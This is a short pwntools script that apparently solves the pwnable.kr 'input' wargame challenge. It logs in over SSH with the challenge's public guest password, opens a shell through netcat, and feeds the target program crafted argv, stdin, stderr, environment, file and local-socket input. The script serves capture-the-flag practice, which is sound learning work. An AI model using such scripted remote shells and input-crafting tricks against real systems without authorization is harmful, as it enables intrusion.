from pwn import *
from pwnlib.tubes.ssh import ssh_channel

def recv(shell:ssh_channel):
    while True:
        data = shell.recv(timeout=1)
        if not data:
            break
        print(data.decode(), end="")

#context.log_level = "debug"
port=1025


s = ssh(user='input2',host='pwnable.kr',port=2222,password="guest")

shell = s.shell(b"nc 0 10006")
shell.sendline(b"/bin/bash")
shell.sendline(b"printf '\\0\\0\\0\\0' > $'\\n'")




arr=[b"1"] * 100

arr[0] = b"./input2"
arr[ord('A')]=b"''"
arr[ord('B')]=b"$' \\n\\r'"
arr[ord('C')]=str(port).encode()
arr.append(b"2<&0")
arr.append(b"&")

arr = [b"printf",b"'\\x00\\x0a\\x00\\xff\\x00\\x0a\\x02\\xff'"] + [b"|"] + [ b"env", b"$'\\xde\\xad\\xbe\\xef=\\xca\\xfe\\xba\\xbe'"] + arr
shell.sendline(b" ".join(arr))


shell.sendline(
    b'python3 -c "import socket;sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
        + f"sock.connect(('127.0.0.1',{port}));".encode()+
        b'sock.send(b\'\\xde\\xad\\xbe\\xef\')"'  
)

recv(shell)




#
#
#
#
#
#
#
#
#
#
